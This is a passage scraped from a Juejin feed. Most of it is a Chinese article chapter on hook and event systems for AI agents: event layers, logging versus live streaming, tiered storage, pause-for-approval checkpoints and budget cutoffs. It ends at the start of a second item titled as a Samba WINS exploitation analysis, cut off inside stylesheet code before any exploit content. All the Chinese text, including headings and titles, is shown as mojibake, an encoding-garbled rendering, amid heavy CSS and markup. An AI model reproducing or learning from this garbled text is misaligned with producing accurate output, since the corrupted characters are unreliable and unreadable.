ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¬¬7ç« ï¼šHooks ä¸äº‹ä»¶ç³»ç»Ÿ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7530610228674427b109d06eb2e9dab3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IqL5ZyGYWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769659654&amp;x-signature=sGx0nLhRHbJQZqenkwlckPJAVqA%3D" alt="0001é¡µ.png" loading="lazy"/></p>
<blockquote>
<p><strong>Hooks ä¸ä»…ä»…æ˜¯æŠ€æœ¯æœ¯è¯­ï¼Œå®ƒæ˜¯è®© Agent ä»â€œç©å…· Demoâ€å˜æˆâ€œé è°±å‘˜å·¥â€çš„ç®¡ç†åˆ¶åº¦ã€‚</strong></p>
</blockquote>
<p>å¾ˆå¤šå¼€å‘è€…çš„ Agent ä¹‹æ—…æ˜¯è¿™æ ·ç»“æŸçš„ï¼š åœ¨æœ¬åœ°å¼€å‘æ—¶ï¼Œçœ‹ç€å±å¹•ä¸Šè·³åŠ¨çš„æ–‡å­—è§‰å¾—å¾ˆé…·ã€‚ ä¸€æ—¦éƒ¨ç½²ä¸Šçº¿ï¼Œé¢å¯¹ç”¨æˆ·çš„æŠ•è¯‰ï¼šâ€œå®ƒæ€ä¹ˆå¡ä½äº†ï¼Ÿâ€ã€â€œå®ƒä¸ºä»€ä¹ˆä¹±è¯´è¯ï¼Ÿâ€ã€â€œå®ƒåˆšåˆšæ˜¯ä¸æ˜¯èŠ±äº†æˆ‘ 10 åˆ€ï¼Ÿâ€ ä½ åªèƒ½ç›¯ç€æ»¡å±æ»šåŠ¨çš„ä¹±ç å‘å‘†ï¼Œæ ¹æœ¬ä¸çŸ¥é“è¿™ä½ AI å‘˜å·¥ç°åœ¨è„‘å­é‡Œåœ¨æƒ³ä»€ä¹ˆï¼Œæ‰‹é‡Œåœ¨å¹²ä»€ä¹ˆã€‚</p>
<p>è¿™å°±æ˜¯ <strong>é»‘ç›’å›°å¢ƒ</strong>ã€‚</p>
<p>è§£å†³è¿™ä¸ªé—®é¢˜çš„æ ¸å¿ƒæ¶æ„ï¼Œå°±æ˜¯ <strong>Hooksï¼ˆé’©å­ï¼‰ä¸äº‹ä»¶ç³»ç»Ÿ</strong>ã€‚æœ¬ç« æˆ‘ä»¬å°†å‚è€ƒ Shannon æ¡†æ¶ï¼Œæ‹†è§£å¦‚ä½•æ„å»ºä¸€å¥—èƒ½çœ‹ã€èƒ½ç®¡ã€èƒ½æ‰©çš„ Agent è¿è¡Œæ—¶ç³»ç»Ÿã€‚</p>
<h3 data-id="heading-1">01. ä¸ºä»€ä¹ˆä½ çš„ Agent éœ€è¦ Hooksï¼Ÿ</h3>
<p>åœ¨ä¼ ç»Ÿçš„ App ä¸­ï¼Œç”¨æˆ·ç‚¹å‡»æŒ‰é’® -&gt; è·å¾—ç»“æœï¼Œè¿‡ç¨‹æ˜¯ç¡®å®šçš„ã€‚è¿™å°±åƒ <strong>å·¥å‚æµæ°´çº¿</strong>ï¼Œè¾“å…¥æ ‡å‡†ï¼Œè¾“å‡ºä¹Ÿæ ‡å‡†ã€‚ ä½†åœ¨ Agent åº”ç”¨ä¸­ï¼ŒAI ä¼šå¾ªç¯æ€è€ƒã€æ¨ç†ã€è°ƒç”¨å·¥å…·ï¼Œè¿‡ç¨‹å……æ»¡ä¸ç¡®å®šæ€§ã€‚è¿™æ›´åƒæ˜¯ <strong>çŸ¥è¯†å‹å‘˜å·¥åœ¨åŠå…¬</strong>ï¼Œä½ å¿…é¡»æœ‰ä¸€å¥—ç®¡ç†æœºåˆ¶æ¥ç¡®ä¿ä»–ä¸å‡ºä¹±å­ã€‚</p>
<p>Hooks ç³»ç»Ÿæœ¬è´¨ä¸Šè§£å†³äº†äº§å“å±‚é¢çš„ä¸‰ä¸ªåˆšéœ€ï¼š</p>
<ol>
<li><strong>å¯è§‚æµ‹æ€§ï¼ˆçœ‹ï¼‰</strong> ï¼šå®æ—¶æŠŠ Agent çš„ <strong>è„‘ç”µå›¾</strong>ï¼ˆæ€è€ƒè¿‡ç¨‹ï¼‰ç”»ç»™ç”¨æˆ·çœ‹ï¼Œè€Œä¸æ˜¯è®©ç”¨æˆ·å¯¹ç€ç©ºç™½å±å¹•å¹²ç­‰ç„¦è™‘ã€‚</li>
<li><strong>å¯æ§æ€§ï¼ˆç®¡ï¼‰</strong> ï¼šåœ¨å…³é”®èŠ‚ç‚¹ï¼ˆå¦‚å¤§é¢æ”¯ä»˜ã€æ•æ„Ÿæ“ä½œã€å‘é€é‚®ä»¶ï¼‰å¼ºåˆ¶æŒ‰ä¸‹æš‚åœé”®ï¼Œç­‰å¾…äººç±»æ‰¹å‡†ã€‚</li>
<li><strong>è§£è€¦æ‰©å±•ï¼ˆæ‰©ï¼‰</strong> ï¼šæœªæ¥æƒ³åŠ ä¸ª <strong>è€—æ—¶ç»Ÿè®¡</strong> æˆ– <strong>é¢„ç®—ç›‘æ§</strong> åŠŸèƒ½ï¼Œä¸éœ€è¦ä¼¤ç­‹åŠ¨éª¨æ”¹æ ¸å¿ƒä»£ç ï¼ŒæŒ‚ä¸ªæ’ä»¶ï¼ˆHookï¼‰å°±è¡Œã€‚</li>
<li/>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b7275c097b745b9b5093e63b921566c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IqL5ZyGYWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769659654&amp;x-signature=PXA4bdIZDAPGUJmFIICwpxLvv%2Fc%3D" alt="0003é¡µ.png" loading="lazy"/>
æ²¡æœ‰ Hooksï¼Œä½ çš„ Agent å°±æ˜¯åœ¨è£¸å¥”ï¼›æœ‰äº† Hooksï¼Œå®ƒæ‰ç©¿ä¸Šäº†åˆ¶æœã€‚</p>
<h3 data-id="heading-2">02. è®¾è®¡ä¸€å¥—ç§‘å­¦çš„â€œäº‹ä»¶æ€»çº¿â€</h3>
<p>è¦å®ç° Hooksï¼Œé¦–å…ˆè¦å®šä¹‰ Agent ä¼šå‘å‡ºå“ªäº›å£°éŸ³ã€‚Shannon å°†äº‹ä»¶åˆ†ä¸ºå››å±‚ï¼Œè¿™å¯¹äºäº§å“è®¾è®¡éå¸¸æœ‰å‚è€ƒä»·å€¼ï¼š</p>
<ol>
<li><strong>ç”Ÿå‘½å‘¨æœŸäº‹ä»¶</strong>ï¼š<code>ä»»åŠ¡å¼€å§‹</code>ã€<code>ä»»åŠ¡ç»“æŸ</code> â€”â€” ç”¨äºå®è§‚ç»Ÿè®¡ï¼ˆæ¯”å¦‚ï¼šä»Šå¤©è·‘äº†å¤šå°‘ä¸ªä»»åŠ¡ï¼Ÿï¼‰ã€‚</li>
<li><strong>æ‰§è¡ŒçŠ¶æ€äº‹ä»¶</strong>ï¼š<code>æ€è€ƒä¸­</code>ã€<code>è°ƒç”¨å·¥å…·</code> â€”â€” ç”¨äºå‰ç«¯å±•ç¤ºè¿›åº¦æ¡ï¼ˆæ¯”å¦‚ï¼šæ­£åœ¨æœç´¢ Google...ï¼‰ã€‚</li>
<li><strong>LLM åŸå§‹äº‹ä»¶</strong>ï¼š<code>æµå¼åå­—</code> â€”â€” ç”¨äºé‚£ä¸ªé…·ç‚«çš„æ‰“å­—æœºæ•ˆæœã€‚</li>
<li><strong>æ§åˆ¶æµäº‹ä»¶</strong>ï¼š<code>è¯·æ±‚å®¡æ‰¹</code>ã€<code>å·²æš‚åœ</code> â€”â€” ç”¨äºäººæœºäº¤äº’ï¼ˆæ¯”å¦‚ï¼šå¼¹çª—è¯¢é—®ç”¨æˆ·æ˜¯å¦ç»§ç»­ï¼‰ã€‚</li>
</ol>
<h4 data-id="heading-3">å…³é”®ç­–ç•¥ï¼šåŒé‡å‘å¸ƒæœºåˆ¶</h4>
<p>åœ¨å·¥ç¨‹å®ç°ä¸Šï¼Œæˆ‘ä»¬é‡‡ç”¨äº†ä¸€ä¸ªç¨³å¥çš„ <strong>åŒé‡å‘å¸ƒ</strong> ç­–ç•¥ã€‚å½“ Agent åšäº†ä¸€ä¸ªåŠ¨ä½œæ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åšä¸¤ä»¶äº‹ï¼Œè¿™æ°å¥½å¯¹åº”äº†å¿ƒç†å­¦ä¸­çš„ <strong>æ½œæ„è¯†</strong> ä¸ <strong>æ˜¾æ„è¯†</strong>ï¼š</p>
<blockquote>
<p><strong>åŠ¨ä½œ Aï¼šè®°æ—¥è®°ï¼ˆå†™æ—¥å¿—ï¼‰â€”â€” ç³»ç»Ÿçš„æ½œæ„è¯†</strong></p>
<ul>
<li><strong>ç›®çš„</strong>ï¼šç»™å¼€å‘è€…çœ‹ï¼ˆå®¡è®¡è§†è§’ï¼‰ã€‚</li>
<li><strong>ä½œç”¨</strong>ï¼šæ‚„æ‚„è®°åœ¨åå°æ•°æ®åº“é‡Œï¼Œè¿™æ˜¯ç³»ç»Ÿçš„ <strong>é•¿æœŸè®°å¿†</strong>ã€‚å°±åƒäººçš„æ½œæ„è¯†ä¸€æ ·ï¼Œè™½ç„¶å¹³æ—¶ä¸è¢«æ„ŸçŸ¥ï¼Œä½†å¦‚æœå‡ºäº† Bugï¼Œè¿™æœ¬æµæ°´è´¦å°±æ˜¯å”¯ä¸€çš„è¿½æº¯çº¿ç´¢ã€‚</li>
</ul>
<p><strong>åŠ¨ä½œ Bï¼šå‘å¹¿æ’­ï¼ˆæ¨å®æ—¶æµï¼‰â€”â€” ç³»ç»Ÿçš„æ˜¾æ„è¯†</strong></p>
<ul>
<li><strong>ç›®çš„</strong>ï¼šç»™ç”¨æˆ·çœ‹ï¼ˆä½“éªŒè§†è§’ï¼‰ã€‚</li>
<li><strong>ä½œç”¨</strong>ï¼šç«‹åˆ»æ¨é€åˆ°ç”¨æˆ·å±å¹•ä¸Šã€‚è¿™æ˜¯ç³»ç»Ÿçš„ <strong>çŸ­æœŸå·¥ä½œè®°å¿†</strong>ï¼Œåªè´Ÿè´£å½“ä¸‹çš„å³æ—¶äº¤äº’ï¼Œå¤„ç†å®Œå³å¿˜ã€‚</li>
</ul>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35f62fee368245ccb4b0f02db314d7e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IqL5ZyGYWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769659654&amp;x-signature=vkM%2BkSUPTroZ0KRO0JIZjfkb%2BXU%3D" alt="0005é¡µ.png" loading="lazy"/>
è¿™ç§ <strong>å¿«æ…¢åˆ†ç¦»</strong> çš„è®¾è®¡ï¼Œæ—¢ä¿è¯äº†æ•°æ® <strong>ä¸¢ä¸äº†</strong>ï¼ˆæŒä¹…æ€§ï¼‰ï¼Œåˆä¿è¯äº†ä½“éªŒ <strong>è¶³å¤Ÿå¿«</strong>ï¼ˆå®æ—¶æ€§ï¼‰ã€‚</p>
<h3 data-id="heading-4">03. æµé‡æ²»ç†ï¼šåˆ†çº§å­˜å‚¨çš„æ™ºæ…§</h3>
<p>Agent è¿è¡Œæ—¶çš„åºŸè¯å…¶å®å¾ˆå¤šï¼Œå°¤å…¶æ˜¯å¤§æ¨¡å‹çš„æµå¼è¾“å‡ºï¼ˆæ‰“å­—æœºæ•ˆæœï¼‰ï¼Œä¸€ç§’é’Ÿå¯èƒ½è¹¦å‡ºå‡ åä¸ªå­—ã€‚å¦‚æœæŠŠè¿™äº›å­—å…¨éƒ½å­˜è¿›æ ¸å¿ƒæ•°æ®åº“ï¼Œæ•°æ®åº“ç¬é—´å°±ä¼šè¢«æ’‘çˆ†ã€‚</p>
<p>Shannon çš„ <strong>åˆ†çº§å­˜å‚¨</strong> ç­–ç•¥ï¼Œæ ¸å¿ƒé€»è¾‘åœ¨äºåŒºåˆ†æ•°æ®çš„ <strong>æœ‰æ•ˆæœŸ</strong>ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰æ•°æ®éƒ½å€¼å¾—æ°¸ä¹…ä¿å­˜ï¼š</p>























<table><thead><tr><th>æ•°æ®ç±»å‹</th><th>ä¾‹å­</th><th>å¤„ç†æ–¹å¼</th><th>æ ¸å¿ƒé€»è¾‘</th></tr></thead><tbody><tr><td><strong>é«˜é¢‘ä½å€¼</strong></td><td>æ‰“å­—æœºæ•ˆæœçš„æ¯ä¸€ä¸ªå­—</td><td><strong>æ¨å®Œå³å¼ƒ</strong>ï¼šåªå±•ç¤ºç»™å‰ç«¯çœ‹ï¼Œä¸å­˜å…¥ç¡¬ç›˜ã€‚</td><td><strong>é˜…åå³ç„š</strong>ï¼šåƒç›´æ’­æ—¶çš„å¼¹å¹•ï¼Œçƒ­é—¹ä¸€ä¸‹å°±è¿‡å»äº†ï¼Œä¸å€¼å¾—å ç”¨æ˜‚è´µçš„å­˜å‚¨èµ„æºã€‚</td></tr><tr><td><strong>ä½é¢‘é«˜å€¼</strong></td><td>æœ€ç»ˆç”Ÿæˆçš„æŠ¥å‘Šã€å·¥å…·è°ƒç”¨çš„ç»“æœ</td><td><strong>æ°¸ä¹…å­˜æ¡£</strong>ï¼šå¿…é¡»å­˜å…¥æ ¸å¿ƒæ•°æ®åº“ï¼Œéšæ—¶å¯æŸ¥ã€‚</td><td><strong>é•¿æœŸå­˜æ¡£</strong>ï¼šåƒç­¾ç½²çš„å•†ä¸šåˆåŒï¼Œå¿…é¡»é”è¿›ä¿é™©æŸœï¼Œä½œä¸ºæœªæ¥çš„å†³ç­–ä¾æ®ã€‚</td></tr></tbody></table>
<p>è¿™ç§ç­–ç•¥æ—¢ä¿è¯äº†ç”¨æˆ·ä½“éªŒæµç•…ï¼Œåˆå¸®å…¬å¸çœä¸‹äº†å·¨é¢çš„æ•°æ®åº“å­˜å‚¨æˆæœ¬â€”â€”è¿™ä¸ä»…æ˜¯æŠ€æœ¯ä¼˜åŒ–ï¼Œæ›´æ˜¯ <strong>å•†ä¸šæˆæœ¬æ§åˆ¶</strong>ã€‚</p>
<h3 data-id="heading-5">04. æ€æ‰‹çº§åŠŸèƒ½ï¼šæš‚åœä¸â€œæ—¶é—´å†»ç»“â€</h3>
<p>Hooks ç³»ç»Ÿæœ€å¼ºå¤§çš„åœ°æ–¹ï¼Œä¸åœ¨äºè®°å½•ï¼Œè€Œåœ¨äº <strong>å¹²é¢„</strong>ã€‚</p>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ çš„ Agent è·‘äº†ä¸€åŠï¼Œçªç„¶é‡åˆ°äº†ä¸€ä¸ªæ¨¡æ£±ä¸¤å¯çš„éœ€æ±‚ã€‚æ™®é€šçš„è„šæœ¬åªèƒ½ç¡¬ç€å¤´çš®çŒœï¼Œæˆ–è€…æŠ¥é”™é€€å‡ºã€‚ä½†æˆç†Ÿçš„ Agent ç³»ç»Ÿå¯ä»¥ <strong>å†»ç»“æ—¶é—´</strong>ã€‚</p>
<p>è¿™æ¶‰åŠåˆ°äº†äººæœºåä½œä¸­æœ€é‡è¦çš„å“²å­¦å‘½é¢˜ï¼š<strong>æƒè´£è¾¹ç•Œçš„äº¤æ¥</strong>ã€‚</p>
<ol>
<li><strong>é‡Šæ”¾èµ„æº</strong>ï¼šæš‚åœæœŸé—´ï¼ŒæœåŠ¡å™¨ä¸å†ç©ºè½¬è€—ç”µã€‚</li>
<li><strong>çŠ¶æ€ä¿æŒ</strong>ï¼šAI çš„æ‰€æœ‰è®°å¿†ã€å˜é‡éƒ½è¢«å®Œæ•´ä¿å­˜ã€‚</li>
<li><strong>éšæ—¶å”¤é†’</strong>ï¼šä¸€æ—¦æ”¶åˆ°äººç±»çš„ <strong>ç»§ç»­</strong> æŒ‡ä»¤ï¼Œç«‹åˆ»æ¢å¤ç°åœºï¼Œæ¥ç€å¹²æ´»ã€‚</li>
</ol>
<h4 data-id="heading-6">å°±åƒæ¸¸æˆçš„â€œè‡ªåŠ¨å­˜æ¡£ç‚¹â€</h4>
<p>æˆ‘ä»¬å¯ä»¥æŠŠ Agent çš„å·¥ä½œæµæƒ³è±¡æˆé€šå…³æ¸¸æˆã€‚ç¨‹åºå‘˜ä¼šåœ¨å…³é”®å…³å¡å‰åŸ‹ä¸‹ <strong>æ£€æŸ¥ç‚¹</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼ªä»£ç æ¼”ç¤ºé€»è¾‘</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">AIå·¥ä½œæµ</span>():
    AI_åšè°ƒç ”()
    
    <span class="hljs-comment"># ã€æ£€æŸ¥ç‚¹ã€‘ï¼šè¿™é‡Œæ˜¯æœºå™¨æ—¶é—´ä¸äººç±»æ—¶é—´çš„äº¤æ±‡ç‚¹</span>
    <span class="hljs-comment"># æœºå™¨åœ¨è¿™é‡Œäº¤å‡ºæ§åˆ¶æƒï¼ˆHandoverï¼‰</span>
    <span class="hljs-comment"># ç­‰å¾…äººç±»ç¡®è®¤åï¼Œå†æ”¶å›æ§åˆ¶æƒ</span>
    æ£€æŸ¥æ˜¯å¦æš‚åœ()
    
    AI_å†™æŠ¥å‘Š()
</code></pre>
<p>è¿™è®© Agent å…·å¤‡äº† <strong>è¸©åˆ¹è½¦</strong> çš„èƒ½åŠ›ï¼Œæ˜¯å°† AI å…³è¿›ç¬¼å­é‡Œçš„æœ€åä¸€é“é˜²çº¿ã€‚</p>
<h3 data-id="heading-7">05. è¿›é˜¶ç©æ³•ï¼šéä¾µå…¥å¼æ‰©å±•</h3>
<p>æœ‰äº†è¿™å¥—ç³»ç»Ÿï¼Œäº§å“ç»ç†å°±å¯ä»¥åœ¨ä¸éº»çƒ¦æ ¸å¿ƒå¼€å‘å›¢é˜Ÿçš„æƒ…å†µä¸‹ï¼Œæå‡ºå„ç§è¿è¥éœ€æ±‚ã€‚è¿™ç¬¦åˆç°ä»£ç®¡ç†å­¦ä¸­çš„ <strong>æµç¨‹æ ‡å‡†åŒ–ä¸ä¾‹å¤–ç®¡ç†</strong>ï¼š</p>
<ul>
<li><strong>é¢„ç®—ç†”æ–­å™¨</strong>ï¼šç›‘å¬äº‹ä»¶æµï¼Œä¸€æ—¦å‘ç° Token æ¶ˆè€—è¶…è¿‡ 5 ç¾å…ƒï¼Œç›´æ¥è‡ªåŠ¨ææ–­ä»»åŠ¡ï¼Œé˜²æ­¢è´¦å•çˆ†ç‚¸ã€‚</li>
<li><strong>æ•æ„Ÿè¯å®¡è®¡</strong>ï¼šåœ¨ AI å‘å‡ºè¯·æ±‚å‰æ‹¦æˆªæ£€æŸ¥ï¼Œå¦‚æœåŒ…å«è¿è§„è¯ï¼Œç›´æ¥é©³å›ã€‚</li>
<li><strong>äººå·¥å®¡æ‰¹</strong>ï¼šå½“æ£€æµ‹åˆ° AI æƒ³è¦æ‰§è¡Œ <strong>åˆ é™¤æ–‡ä»¶</strong> æˆ– <strong>å‘é€é‚®ä»¶</strong> ç­‰é«˜å±æ“ä½œæ—¶ï¼Œå¼ºåˆ¶è§¦å‘æš‚åœï¼Œå¼¹çª—è®©è€æ¿ç¡®è®¤ã€‚</li>
</ul>
<h3 data-id="heading-8">æ€»ç»“ï¼šä»è„šæœ¬åˆ°ç³»ç»Ÿ</h3>
<p>å¦‚æœè¯´ LLM æ˜¯ Agent çš„ <strong>å¤§è„‘</strong>ï¼Œé‚£ä¹ˆ Hooks å°±æ˜¯å®ƒçš„ <strong>ç¥ç»ç³»ç»Ÿ</strong>ã€‚</p>
<ul>
<li><strong>è„šæœ¬çº§ Agent</strong>ï¼šåªæœ‰å¤§è„‘ï¼Œé—·å¤´å¹²æ´»ï¼Œä¸ç®¡ä¸é¡¾ã€‚</li>
<li><strong>å¹³å°çº§ Agent</strong>ï¼šæ‹¥æœ‰ç¥ç»ç³»ç»Ÿï¼Œèƒ½æ„ŸçŸ¥ç—›è§‰ï¼ˆæŠ¥é”™ï¼‰ï¼Œèƒ½æ¥æ”¶æŒ‡ä»¤ï¼ˆæš‚åœï¼‰ï¼Œèƒ½ä¼ é€’ä¿¡å·ï¼ˆå®æ—¶åé¦ˆï¼‰ã€‚</li>
</ul>
<p><strong>ç»™å›¢é˜Ÿçš„å»ºè®®ï¼š</strong> ä¸è¦ç­‰åˆ°ç”¨æˆ·æŠ•è¯‰äº†æ‰æƒ³èµ·æ¥åšç›‘æ§ã€‚åœ¨æ„å»º Agent çš„ç¬¬ä¸€å¤©ï¼Œå°±åº”è¯¥æŠŠè¿™å¥— <strong>ä»ªè¡¨ç›˜</strong> å’Œ <strong>åˆ¹è½¦ç³»ç»Ÿ</strong> è®¾è®¡è¿›å»ã€‚è¿™ä¸æ˜¯è¿‡åº¦è®¾è®¡ï¼Œè¿™æ˜¯è®© AI èµ°å‡ºå®éªŒå®¤ã€ä»å®¹é¢å¯¹çœŸå®ä¸–ç•Œçš„åº•æ°”ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf6b82e132a446d4a36ff263e5bf3d0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IqL5ZyGYWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769659654&amp;x-signature=jJGmg1G0tx5omTO%2BzwTO26%2FAFtU%3D" alt="0015é¡µ.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Samba WINS æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡å…¨è§£æ]]></title>    <link>https://juejin.cn/post/7597757676425904147</link>    <guid>https://juejin.cn/post/7597757676425904147</guid>    <pubDate>2026-01-22T05:31:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597757676425904147" data-draft-id="7597757676425887763" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Samba WINS æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡å…¨è§£æ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-22T05:31:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Samba WINS æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡å…¨è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T05:31:41.000Z" title="Thu Jan 22 2026 05:31:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 